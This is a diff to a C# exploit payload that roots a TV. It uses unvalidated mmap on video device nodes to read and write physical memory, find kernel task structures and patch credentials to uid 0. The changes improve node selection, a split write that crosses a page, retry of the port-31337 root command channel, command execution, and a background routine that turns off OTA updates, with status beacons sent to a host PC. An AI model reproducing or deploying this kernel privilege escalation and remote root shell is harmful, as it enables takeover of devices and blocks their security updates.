@@ -21,8 +21,10 @@ internal static class Program
     const string Marker = Share + "/root_boot.txt";
     const string SysProof = "/opt/usr/system/dsh_root_proof.txt";
     // Fallback only: deploy.sh records the real PC address in rootchan.host, which
-// HostAddr() prefers. Kept so a hand-built payload still beacons somewhere.
-    const string Host = "192.168.178.214";
+    // HostAddr() prefers.  TEST-NET-1 keeps a private LAN IP out of the source
+    // (and out of a release); a hand-built payload beacons nowhere, which is the
+    // honest outcome until deploy.sh has run.
+    const string Host = "192.0.2.1";
     const string HostFile = Share + "/rootchan.host";
     // One IP per line; if the file exists, only those peers may use port 31337.
     const string AllowFile = Share + "/rootchan.allow";
@@ -67,6 +69,15 @@ internal static class Program
     // because it munmaps after every op.
 
     static int _fd = -1;
+    // The physmap node.  video40 is the jpeg codec and the documented one, but
+    // the three sdp nodes (video30/hen, video40/jpeg, video60/dvde) each expose
+    // the same unvalidated mmap, and exclusivity is PER INSTANCE (reference:
+    // recon/VIDEO-PHYSMAP-2026-10-20.md).  A single hardcoded node turned one
+    // busy instance into a 120 s boot delay; the list makes it portable and
+    // lets the payload coexist with a browser stub on another node.
+    static readonly string[] Nodes = { "/dev/video40", "/dev/video30", "/dev/video60" };
+    static string _node = Nodes[0];
+    static int _openErrno = 0;
     static readonly Dictionary<uint, IntPtr> Pages = new Dictionary<uint, IntPtr>();
     // fork() landmark pids that still need reaping (see ReapChildren).
     static readonly List<int> ChildPids = new List<int>();
@@ -328,6 +339,63 @@ internal static class Program
         }
     }
 
+    // Node policy (v39.1).  video40 is the only node this unit is known to serve
+    // coherently for every read the payload performs: its scans reach phys
+    // 0x60000000 and video30 is known to hang at 0x46000000.  So:
+    //   EBUSY            -> KEEP RETRYING video40 for the whole budget.  A
+    //                       browser stub holding video40 must not push the boot
+    //                       payload onto a node that cannot finish the scan.
+    //   ENOENT / ENODEV  -> the node does not exist here; try the next one.
+    //   anything else    -> retry the same node (a transient EACCES/EMFILE is
+    //                       not a reason to switch to a node with a different
+    //                       read limit).
+    // Beacon on a state CHANGE, plus one "still waiting" line every 30 s; the
+    // v39 cut logged once per attempt because the index cycles.
+    static bool OpenDevice(int budgetMs)
+    {
+        var sw = System.Diagnostics.Stopwatch.StartNew();
+        int idx = 0;
+        int lastIdx = -1, lastErr = -1;
+        long lastWaitBeacon = -30000;
+        while (sw.ElapsedMilliseconds < budgetMs)
+        {
+            string n = Nodes[idx];
+            int fd = open(n, 2 /*O_RDWR*/);
+            if (fd >= 0)
+            {
+                _fd = fd;
+                _node = n;
+                _openErrno = 0;
+                return true;
+            }
+            int e = Marshal.GetLastWin32Error();
+            _openErrno = e;
+            bool absent = (e == 2 /*ENOENT*/ || e == 19 /*ENODEV*/);
+            if (absent && idx + 1 < Nodes.Length)
+            {
+                if (idx != lastIdx || e != lastErr)
+                    Beacon("open " + n + " errno=" + e + " (absent), trying " + Nodes[idx + 1]);
+                lastIdx = idx; lastErr = e;
+                idx++;
+                continue;
+            }
+            if (idx != lastIdx || e != lastErr)
+            {
+                lastIdx = idx; lastErr = e;
+                Beacon("open " + n + " errno=" + e +
+                       (e == 16 ? " (busy, retrying this node)" : " (retrying this node)"));
+            }
+            else if (sw.ElapsedMilliseconds - lastWaitBeacon >= 30000)
+            {
+                lastWaitBeacon = sw.ElapsedMilliseconds;
+                Beacon("open " + n + " still errno=" + e + " after " +
+                       (sw.ElapsedMilliseconds / 1000) + "s");
+            }
+            usleep(1000000);
+        }
+        return false;
+    }
+
     // One RDWR opener: close, then retry open.  Call only while no landmark
     // child exists.  v20 called this after fork(); the child still held the
     // inherited fd, open() returned -1, and the hunt never ran.
@@ -337,13 +405,15 @@ internal static class Program
         int old = _fd;
         _fd = -1;
         if (old >= 0) { try { close(old); } catch { } }
-        for (int i = 0; i < 50 && _fd < 0; i++)
-        {
-            _fd = open("/dev/video40", 2 /*O_RDWR*/);
-            if (_fd < 0) usleep(100000);
-        }
-        Beacon("reopen video40 fd=" + _fd);
-        return _fd >= 0;
+        bool ok = OpenDevice(30000);
+        Beacon("reopen " + _node + " fd=" + _fd + (ok ? "" : " errno=" + _openErrno));
+        return ok;
+    }
+
+    static void CloseDevice()
+    {
+        try { if (_fd >= 0) { close(_fd); Beacon("device closed"); } } catch { }
+        _fd = -1;
     }
 
     static byte[] ReadPhys(uint phys, int len)
@@ -368,12 +438,26 @@ internal static class Program
 
     static void Write32(uint phys, uint val)
     {
-        uint page = phys & 0xFFFFF000;
         int off = (int)(phys & 0xFFF);
-        IntPtr p = MapPage(page);
-        IntPtr slot = IntPtr.Add(p, off);
-        Marshal.WriteInt32(slot, unchecked((int)val));
-        Flush(slot, 4);
+        if (off <= 0xFFC)
+        {
+            IntPtr p = MapPage(phys & 0xFFFFF000);
+            IntPtr slot = IntPtr.Add(p, off);
+            Marshal.WriteInt32(slot, unchecked((int)val));
+            Flush(slot, 4);
+            return;
+        }
+        // A 4-byte word that starts in the last 3 bytes of a page crosses the
+        // mapping (the stub rejects this; the payload used to write past its own
+        // 4 KiB mapping).  Split it byte-wise instead of refusing the write.
+        for (int i = 0; i < 4; i++)
+        {
+            uint a = phys + (uint)i;
+            IntPtr p = MapPage(a & 0xFFFFF000);
+            IntPtr at = IntPtr.Add(p, (int)(a & 0xFFF));
+            Marshal.WriteByte(at, (byte)(val >> (8 * i)));
+            Flush(at, 1);
+        }
     }
 
     // LPAE direct map on this TV spans 0xC0000000..0xFFFFFFFF (1 GB).  Accept the
@@ -555,22 +639,9 @@ internal static class Program
         return res;
     }
 
-    // returns (taskVirt, commPhys) of the fork child, scanning the list tail
-    static bool FindCommNearTail(uint initPhys, uint initVirt, uint off, byte[] want, int hops, out uint taskVirt)
-    {
-        taskVirt = 0;
-        uint h = initVirt + off;
-        uint cur;
-        try { cur = U32(ReadPhys(initPhys + off + 4, 4), 0); } catch { return false; }
-        for (int i = 0; i < hops; i++)
-        {
-            if (!Kptr(cur) || cur == h) return false;
-            uint task = (cur - off) & 0xFFFFFFFF;
-            if (CommAt(task, want)) { taskVirt = task; return true; }
-            try { cur = U32(ReadPhys(V2P(cur) + 4, 4), 0); } catch { return false; }
-        }
-        return false;
-    }
+    // (FindCommNearTail lived here until v39.  It was never called after the
+    // direct-parent path replaced the comm scan; the round walk in Main() does
+    // the tail scan itself, with the `pre`/latch logic that made this obsolete.)
 
     // Pointer-shape validation only: a real cred lives in the direct map, has a
     // small refcount and plausible ids.  Whether it is OURS is PatchCred's job
@@ -834,15 +905,17 @@ internal static class Program
             // the frame.  Locate only - never patched.
             verdict = "cred-miss";
             uint anchor = V2P(child) & 0xFFFFF000;
+            uint childCredPhys = 0;
             try
             {
                 uint cc = U32(ReadPhys(V2P(child) + O_CRED, 4), 0);
+                if (Kptr(cc)) childCredPhys = V2P(cc);
                 // the child's cred can itself be the high object (v30/v31 boots:
                 // ccred=e2c35300) - its translated page is then outside the
                 // sweep and the child's TASK page (low, the walk read its comm)
                 // is the anchor
-                if (Kptr(cc) && V2P(cc) >= 0x20000000 && V2P(cc) < 0x40000000)
-                    anchor = V2P(cc) & 0xFFFFF000;
+                if (childCredPhys >= 0x20000000 && childCredPhys < 0x40000000)
+                    anchor = childCredPhys & 0xFFFFF000;
             }
             catch { }
             var pat16 = new byte[16];
@@ -868,9 +941,20 @@ internal static class Program
                     {
                         if (idx >= 4)
                         {
+                            uint hitCred = page + (uint)idx - 4;
+                            // The ids pattern repeats every 8 bytes inside one
+                            // cred, so skip the whole object, not just its
+                            // start: the child's cred is a fork COPY that always
+                            // holds OUR ids (review 2026-10-26).
+                            if (childCredPhys != 0 && hitCred >= childCredPhys &&
+                                hitCred < childCredPhys + 0x40)
+                            {
+                                idx = IndexOf(data, pat16, idx + 1);
+                                continue;
+                            }
                             found = true;
                             atPage = page;
-                            atCred = page + (uint)idx - 4;
+                            atCred = hitCred;
                             // CredUid wants a kernel VA; atCred is physical
                             uid = CredUid((atCred + PHYS_OFF) & 0xFFFFFFFF);
                             verdict = "cred-elsewhere";   // the translated frame (>= 0x40000000) can never equal this
@@ -895,7 +979,8 @@ internal static class Program
                " verdict=" + verdict);
     }
 
-    // Parent-cred uid of a PHYRFORK, for the hunt latch.    // 5001 = ours.  Anything else used to be skip-orphan. v22 still dropped
+    // Parent-cred uid of a PHYRFORK, for the hunt latch.
+    // 5001 = ours.  Anything else used to be skip-orphan. v22 still dropped
     // attempt 1 when the stale parent cred read as some uid other than 0 /
     // 0xFFFFFFFF (cold boot 2026-10-25: seen=1 skip-orphan=1, child=0).
     // v23 latches every new PHYRFORK not in `pre`; PatchCred still writes
@@ -1018,49 +1103,64 @@ internal static class Program
 
     static void RootChannel()
     {
-        try
+        // A failed bind used to end RootChannel and throw away a successful root
+        // (the process then exited as a fast attempt).  Keep trying instead: the
+        // port can be in TIME_WAIT or the address may come up seconds later.
+        while (true)
         {
-            IPAddress bound;
-            var l = ListenOn(BindAddress(), out bound);
-            Beacon("ROOTCHAN 31337 uid=" + getuid() + " bind=" + bound);
-            // The TV's address can move (DHCP, Wi-Fi reconnect).  A fixed bind
-            // would then be a dead port until the app restarted, so re-derive it
-            // every 30 s and listen again when it changes.  Pending() polling
-            // (not a blocking accept) is what makes that possible.
-            DateTime nextCheck = DateTime.UtcNow.AddSeconds(30);
-            while (true)
+            TcpListener l = null;
+            try
             {
-                if (DateTime.UtcNow >= nextCheck)
+                IPAddress bound;
+                l = ListenOn(BindAddress(), out bound);
+                Beacon("ROOTCHAN 31337 uid=" + getuid() + " bind=" + bound);
+                // The TV's address can move (DHCP, Wi-Fi reconnect).  A fixed bind
+                // would then be a dead port until the app restarted, so re-derive
+                // it every 30 s and listen again when it changes.  Pending()
+                // polling (not a blocking accept) is what makes that possible.
+                DateTime nextCheck = DateTime.UtcNow.AddSeconds(30);
+                while (true)
                 {
-                    nextCheck = DateTime.UtcNow.AddSeconds(30);
-                    IPAddress now = BindAddress();
-                    if (!now.Equals(bound))
+                    if (DateTime.UtcNow >= nextCheck)
                     {
-                        try { l.Stop(); } catch { }
-                        l = ListenOn(now, out bound);
-                        Beacon("chan rebind " + bound);
+                        nextCheck = DateTime.UtcNow.AddSeconds(30);
+                        IPAddress now = BindAddress();
+                        if (!now.Equals(bound))
+                        {
+                            try { l.Stop(); } catch { }
+                            l = ListenOn(now, out bound);
+                            Beacon("chan rebind " + bound);
+                        }
                     }
-                }
-                if (!l.Pending())
-                {
-                    Thread.Sleep(250);
-                    continue;
-                }
-                using (var c = l.AcceptTcpClient())
-                {
-                    string ip = "";
-                    try { ip = ((IPEndPoint)c.Client.RemoteEndPoint).Address.ToString(); } catch { }
-                    if (!PeerAllowed(ip))
+                    if (!l.Pending())
                     {
-                        Beacon("chan deny " + ip);
-                        c.Close();
+                        Thread.Sleep(250);
                         continue;
                     }
-                    try { Serve(c); } catch (Exception e) { Beacon("chan " + e.Message); }
+                    using (var c = l.AcceptTcpClient())
+                    {
+                        string ip = "";
+                        try { ip = ((IPEndPoint)c.Client.RemoteEndPoint).Address.ToString(); } catch { }
+                        if (!PeerAllowed(ip))
+                        {
+                            Beacon("chan deny " + ip);
+                            c.Close();
+                            continue;
+                        }
+                        try { Serve(c); } catch (Exception e) { Beacon("chan " + e.Message); }
+                    }
                 }
             }
+            catch (Exception e)
+            {
+                // The listener that just threw may still hold 31337 in the
+                // socket table; without Stop() the next bind can fail until the
+                // socket is collected.
+                try { if (l != null) l.Stop(); } catch { }
+                Beacon("chan fail " + e.Message + " (retrying in 5s)");
+                Thread.Sleep(5000);
+            }
         }
-        catch (Exception e) { Beacon("chan fail " + e.Message); }
     }
 
     const int MaxCmd = 4096;          // one command line over 31337
@@ -1120,38 +1220,79 @@ internal static class Program
         }
     }
 
+    const int RunTimeoutMs = 120000;      // one command line; deploy/uninstall fit
+    const int RunOutputMax = 1024 * 1024; // never slurp a tmpfs-filling command
+    static int _runSeq = 0;
+
     static string Run(string cmd)
     {
+        string outf = null;
         try
         {
-            // Redirect inside the shell, not through a pipe. A pipe is closed only when
-            // every descendant closes it, and ReadToEnd() then blocks forever if one
-            // outlives the timeout - measured: a single `grep -r /opt` wedged the whole
-            // command channel until the TV was power-cycled.
-            string outf = "/tmp/.dsh_cmd.out";
+            // Unique per call: AutoUpdateOff runs on a background thread while a
+            // channel command can be executing, and the old fixed
+            // /tmp/.dsh_cmd.out had both writing the same file.
+            int n = System.Threading.Interlocked.Increment(ref _runSeq);
+            string baseName = "/tmp/.dsh_cmd." + Environment.ProcessId + "." + n;
+            outf = baseName + ".out";
+            // Redirect INSIDE the shell, not through a pipe: a pipe is closed
+            // only when every descendant closes it, and ReadToEnd() then blocks
+            // forever if one outlives the timeout (a single `grep -r /opt` wedged
+            // the channel until the TV was power-cycled).  The command is passed
+            // as an ARGUMENT ($2), never spliced into the -c string, so `}`, `;`
+            // or quotes in it cannot break the wrapper.
             var psi = new System.Diagnostics.ProcessStartInfo("/bin/sh");
             psi.ArgumentList.Add("-c");
-            psi.ArgumentList.Add("{ " + cmd + " ; } > " + outf + " 2>&1");
+            psi.ArgumentList.Add("exec > \"$1\" 2>&1; exec /bin/sh -c \"$2\"");
+            psi.ArgumentList.Add("_");       // $0
+            psi.ArgumentList.Add(outf);      // $1
+            psi.ArgumentList.Add(cmd);       // $2
             psi.UseShellExecute = false;
             using (var p = System.Diagnostics.Process.Start(psi))
             {
                 if (p == null) return "ERR spawn";
-                if (!p.WaitForExit(15000))
+                bool exited = p.WaitForExit(RunTimeoutMs);
+                if (!exited)
                 {
                     try { p.Kill(true); } catch { }   // whole process tree
                     Thread.Sleep(250);
-                    string partial = "";
-                    try { partial = File.ReadAllText(outf); } catch { }
-                    try { File.Delete(outf); } catch { }
-                    return (partial + "\n[timeout: killed after 15s]").Trim();
                 }
-                string outp = "";
-                try { outp = File.ReadAllText(outf); } catch { }
-                try { File.Delete(outf); } catch { }
+                string outp = ReadCapped(outf);
+                if (!exited)
+                    outp = (outp + "\n[timeout: killed after " +
+                            (RunTimeoutMs / 1000) + "s]").Trim();
                 return outp.TrimEnd();
             }
         }
         catch (Exception ex) { return "ERR " + ex.GetType().Name + ": " + ex.Message; }
+        finally { try { if (outf != null) File.Delete(outf); } catch { } }
+    }
+
+    static string ReadCapped(string path)
+    {
+        try
+        {
+            using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read,
+                                           FileShare.ReadWrite))
+            {
+                long len = fs.Length;
+                int take = (int)Math.Min(len, RunOutputMax);
+                var buf = new byte[take];
+                int off = 0;
+                while (off < take)
+                {
+                    int r = fs.Read(buf, off, take - off);
+                    if (r <= 0) break;
+                    off += r;
+                }
+                string s = Encoding.UTF8.GetString(buf, 0, off);
+                if (len > RunOutputMax)
+                    s += "\n[output truncated at " + RunOutputMax + " bytes of " +
+                         len + "]";
+                return s;
+            }
+        }
+        catch { return ""; }
     }
 
     // The TV will happily replace the app we live in, which would undo the root, so
@@ -1178,30 +1319,38 @@ internal static class Program
         try
         {
             _fd = -1;
-            for (int i = 0; i < 120 && _fd < 0; i++)
+            if (!OpenDevice(120000))
             {
-                _fd = open("/dev/video40", 2 /*O_RDWR*/);
-                if (_fd < 0) Thread.Sleep(1000);   // browser stub may hold it
+                Beacon("fail open node after 120s=" + _fd + " errno=" + _openErrno);
+                Thread.Sleep(30000);
+                return;
             }
-            if (_fd < 0) { Beacon("fail open video40 after 120s=" + _fd); Thread.Sleep(30000); return; }
+            Beacon("device " + _node + " fd=" + _fd);
 
             uint baseAddr = FindBase();
-            if (baseAddr == 0) { Beacon("fail no kernel image"); Thread.Sleep(20000); return; }
+            if (baseAddr == 0) { Beacon("fail no kernel image"); CloseDevice(); Thread.Sleep(20000); return; }
             uint initVirt = LocateInit(baseAddr);
-            if (initVirt == 0) { Beacon("fail no init_task"); Thread.Sleep(20000); return; }
+            if (initVirt == 0) { Beacon("fail no init_task"); CloseDevice(); Thread.Sleep(20000); return; }
             uint initPhys = V2P(initVirt);
             Beacon("kernel=" + baseAddr.ToString("x8") + " init_task=" + initVirt.ToString("x8"));
 
             var offs = TaskOffsets(initPhys, initVirt);
-            if (offs.Count == 0) { Beacon("fail no task offsets"); Thread.Sleep(20000); return; }
-            foreach (uint cand in offs) Beacon("cand off=" + cand.ToString("x"));
+            if (offs.Count == 0) { Beacon("fail no task offsets"); CloseDevice(); Thread.Sleep(20000); return; }
+            var sb = new StringBuilder();
+            foreach (uint cand in offs) { if (sb.Length > 0) sb.Append(','); sb.Append(cand.ToString("x")); }
+            Beacon("cand n=" + offs.Count + " offs=" + sb);
 
             // Second open of this boot, still the sole opener.  Attempt 1 of a
             // cold boot hunts on the same fd FindBase just thrashed; attempt 2
             // (new process) works.  Reopen here, not after fork().
             if (!ReopenVideo())
             {
-                Beacon("fail reopen video40 (continuing on none)");
+                // Without the device every read fails; burning the rounds would
+                // only delay the fresh-process relaunch that can fix it.
+                Beacon("fail reopen video40 errno=" + _openErrno + " (exiting for a fresh process)");
+                CloseDevice();
+                Thread.Sleep(5000);
+                return;
             }
 
             // fork() COPIES the cred, so patching the child never roots us -- the
@@ -1629,10 +1778,14 @@ internal static class Program
                 try { Directory.CreateDirectory("/opt/usr/system"); File.WriteAllText(SysProof, proof); } catch { }
                 try { File.WriteAllText(Share + "/root_proof.txt", proof); } catch { }
                 Beacon("SUCCESS-R00T " + proof.Replace("\n", " "));
-                AutoUpdateOff();
+                // Pin OTA off in the background: three buxton2ctl spawns used to
+                // sit between the root and the listener, delaying the only thing
+                // that makes the set usable.  Run() is per-call safe now
+                // (unique temp files), so this cannot collide with a command.
+                new Thread(() => { try { AutoUpdateOff(); } catch { } }).Start();
 
-                // free /dev/video40 so the browser physmap path works again
-                try { if (_fd >= 0) { close(_fd); _fd = -1; Beacon("device closed"); } } catch { }
+                // free the physmap node so the browser path works again
+                CloseDevice();
 
                 // Landmark children sleep 120 s; a later kill -9 reparents them
                 // to init and the next AUL launch wastes fast attempts on them.
@@ -1646,18 +1799,27 @@ internal static class Program
                 // device and reads coherent memory - measurably faster than the
                 // in-process retry loop, which kept re-reading the same bad state.
                 // Release the device first: AUL's relaunch must not race our own
-                // dying process for the single /dev/video40 opener.
-                if (_fd >= 0) { try { close(_fd); } catch { } _fd = -1; }
+                // dying process for the same node.
+                CloseDevice();
                 KillChildren();
                 Beacon("fast-exit attempt=" + attempt);
                 Thread.Sleep(2000);
                 Environment.Exit(0);
             }
+            // Long mode exhausted its rounds: release the node and the landmark
+            // children before idling, so the browser lane is not blocked for the
+            // whole sleep (v39: it used to keep the opener until exit).
+            CloseDevice();
+            KillChildren();
             Thread.Sleep(120000);
         }
         catch (Exception e)
         {
+            // Release the node and the landmark children before idling: this path
+            // used to sleep 20 s holding the opener, blocking the browser lane.
             Beacon("exception " + e.GetType().Name + ": " + e.Message);
+            CloseDevice();
+            KillChildren();
             Thread.Sleep(20000);
         }
     }
